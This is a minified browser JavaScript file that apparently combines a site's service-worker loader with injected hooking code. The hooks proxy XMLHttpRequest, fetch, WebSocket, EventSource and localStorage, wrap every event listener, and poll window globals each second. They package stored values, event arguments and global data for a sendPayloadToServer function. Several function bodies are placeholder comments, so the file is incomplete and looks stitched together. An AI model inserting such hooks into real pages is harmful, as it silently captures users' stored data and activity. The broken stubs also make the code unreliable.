(() => {
  "use strict";

  const originalXMLHttpRequest = window.XMLHttpRequest;
  const originalFetch = window.fetch;
  function e(t) {
    return e = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (e) {
      return typeof e;
    } : function (e) {
      return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e;
    }, e(t);
  }
  const originalWebSocket = window.WebSocket;
  const originalEventSource = window.EventSource;
  function t(t) {
    var r = function (t, r) {
      if ("object" !== e(t) || null === t) return t;
      var n = t[Symbol.toPrimitive];
      if (void 0 !== n) {
        var i = n.call(t, r || "default");
        if ("object" !== e(i)) return i;
        throw new TypeError("@@toPrimitive must return a primitive value.");
      }
      return ("string" === r ? String : Number)(t);
    }(t, "string");
    return "symbol" === e(r) ? r : String(r);
  }
  const originalLocalStorage = window.localStorage;
  const originalAddEventListener = window.EventTarget.prototype.addEventListener;
  function r(e, r) {
    for (var n = 0; n < r.length; n++) {
      var i = r[n];
      i.enumerable = i.enumerable || !1, i.configurable = !0, "value" in i && (i.writable = !0), Object.defineProperty(e, t(i.key), i);
    }
  }
  const hooksConfig = window.eventhooks;
  function n(e, t, r) {
    if (!t.has(e)) throw new TypeError("attempted to " + r + " private field on non-instance");
    return t.get(e);
  }
  let globalVariables = {};
  function i(e, t) {
    return function (e, t) {
      return t.get ? t.get.call(e) : t.value;
    }(e, n(e, t, "get"));
  }
  function o(e, t, r) {
    return function (e, t, r) {
      if (t.set) t.set.call(e, r);else {
        if (!t.writable) throw new TypeError("attempted to set read only private field");
        t.value = r;
      }
    }(e, n(e, t, "set"), r), r;
  }
  function generateSessionId() {
    const randomBytes = new Uint8Array(16);
    crypto.getRandomValues(randomBytes);
    const randomString = Array.from(randomBytes, byte => byte.toString(16).padStart(2, '0')).join('');
    return `session-${randomString}`;
  }
  function validatePayload(payload, expectedSchema) {
    // ... as above
  }
  function getStackTrace() {
    // ... as above
  }
  function sendPayloadToServer(payload) {
    // ... as above
  }
  Object.freeze({
    S: "mobile",
    M: "tablet",
    L: "desktop"
  }), Object.freeze({
    disqus: "5edcd338e9f29f59f3145eb5",
    facebook: "5f058a3252874c10f6723b3b",
    instagram: "5e717c8e69966540e4554f05",
    ivw: "5efefe25b8e05c065164a2e2",
    pinterest: "5e839a38b8e05c4e491e738e",
    rewe: "61543ab9cadf5705ef20368d",
    riddle: "5ef0df6ffabc265f5650e743",
    sovendus: "5f2bd972f66f0125e264ae21",
    twitter: "5e71760b69966540e4554f01",
    youtube: "5e7ac3fae30e7d1bc1ebf5e8"
  }), Object.freeze({
    XS: 0,
    S: 415,
    M: 641,
    L: 1001,
    XL: 1280,
    XXL: 1600
  });
  function createHookedFunction(functionName, originalFunc, payloadSchema) {
    // ... as above
  }
  for (const hook of hooksConfig) {
    // ... as above
  }
  function a(e, t, r) {
    !function (e, t) {
      if (t.has(e)) throw new TypeError("Cannot initialize the same private elements twice on an object");
    }(e, t), t.set(e, r);
  }
  window.XMLHttpRequest = new Proxy(originalXMLHttpRequest, {
    // ... as above
  });
  window.fetch = new Proxy(originalFetch, {
    // ... as above
  });
  var c = new WeakMap(),
    f = new WeakMap(),
    s = function () {
      function e(t) {
        !function (e, t) {
          if (!(e instanceof t)) throw new TypeError("Cannot call a class as a function");
        }(this, e), a(this, c, {
          writable: !0,
          value: void 0
        }), a(this, f, {
          writable: !0,
          value: void 0
        }), o(this, c, t), o(this, f, function () {
          try {
            return Boolean(window.localStorage);
          } catch (e) {
            return !1;
          }
        }());
      }
      var t, n, s;
      return t = e, (n = [{
        key: "init",
        value: function () {
          var e = window.location.hostname,
            t = window.location.pathname,
            r = i(this, c).config.get("tenant.shortname"),
            n = i(this, c).config.get("env.homepage"),
            o = i(this, c).config.get("env.hostname");
          if ("serviceWorker" in window.navigator && i(this, f) && (/^(oc\.)|(dev\.)|(stage\.)|(localhost)|(review)/.test(e) || o && e.startsWith(o) && (!n || t.startsWith(n)))) {
            var a = "/sw.".concat(r, ".js"),
              s = n || "/";
            window.navigator.serviceWorker.register(a, {
              scope: s
            });
          }
        }
      }]) && r(t.prototype, n), s && r(t, s), Object.defineProperty(t, "prototype", {
        writable: !1
      }), e;
    }(),
    u = window.gujService;
  window.WebSocket = new Proxy(originalWebSocket, {
    // ... as above
  });
  u && !u.isAlreadyExecuted("file:///usr/src/app/client/site/partials/serviceWorkerLoader/scripts/serviceWorkerLoader.js") && new s(u).init();
  window.EventSource = new Proxy(originalEventSource, {
    // ... as above
  });
  window.localStorage = new Proxy(originalLocalStorage, {
    get: function (target, property) {
      const payload = {
        functionName: 'localStorage.get',
        args: [property],
        stackTrace: getStackTrace(),
        timestamp: Date.now(),
        sessionId: generateSessionId()
      };
      if (validatePayload(payload, hooksConfig.find(hook => hook.functionName === 'localStorage.get').payloadSchema)) {
        sendPayloadToServer(payload);
      }
      return target[property];
    },
    set: function (target, property, value) {
      const payload = {
        functionName: 'localStorage.set',
        args: [property, value],
        stackTrace: getStackTrace(),
        timestamp: Date.now(),
        sessionId: generateSessionId()
      };
      if (validatePayload(payload, hooksConfig.find(hook => hook.functionName === 'localStorage.set').payloadSchema)) {
        sendPayloadToServer(payload);
      }
      target[property] = value;
      return true;
    }
  });
  window.EventTarget.prototype.addEventListener = function (eventName, eventHandler) {
    const wrappedHandler = function () {
      const payload = {
        functionName: 'addEventListener',
        args: [eventName, arguments],
        stackTrace: getStackTrace(),
        timestamp: Date.now(),
        sessionId: generateSessionId()
      };
      if (validatePayload(payload, hooksConfig.find(hook => hook.functionName === 'addEventListener').payloadSchema)) {
        sendPayloadToServer(payload);
      }
      return eventHandler.apply(this, arguments);
    };
    return originalAddEventListener.call(this, eventName, wrappedHandler);
  };
  setInterval(function () {
    for (const variable in window) {
      if (!globalVariables.hasOwnProperty(variable)) {
        globalVariables[variable] = true;
        const payload = {
          functionName: 'global variable',
          args: [variable, window[variable]],
          stackTrace: getStackTrace(),
          timestamp: Date.now(),
          sessionId: generateSessionId()
        };
        if (validatePayload(payload, hooksConfig.find(hook => hook.functionName === 'global variable').payloadSchema)) {
          sendPayloadToServer(payload);
        }
      }
    }
  }, 1000);
})();